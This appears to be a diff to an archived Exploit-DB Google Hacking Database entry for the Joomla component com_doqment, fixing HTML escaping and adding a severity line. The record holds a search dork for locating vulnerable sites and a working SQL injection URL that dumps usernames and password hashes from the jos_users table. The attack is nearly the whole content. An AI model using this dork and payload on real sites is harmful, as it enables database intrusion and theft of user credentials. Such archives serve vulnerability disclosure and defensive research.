@@ -1,9 +1,10 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/3623
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2010-11-25
 Author:           anonymous
-GoogleDork:       inurl:index.php?option=com_doqment&amp;cid=
-Description:      inurl:index.php?option=com_doqment&amp;cid=
+GoogleDork:       inurl:index.php?option=com_doqment&cid=
+Description:      inurl:index.php?option=com_doqment&cid=
 
 
-Author: KedAns-Dz http://server/index.php?option=com_doqment&amp;cid=-11/**/union/**/select/**/1,2,concat(username,0x3a,password),4,5,6,7,8/**/from/**/jos_users--
+Author: KedAns-Dz http://server/index.php?option=com_doqment&cid=-11/**/union/**/select/**/1,2,concat(username,0x3a,password),4,5,6,7,8/**/from/**/jos_users--
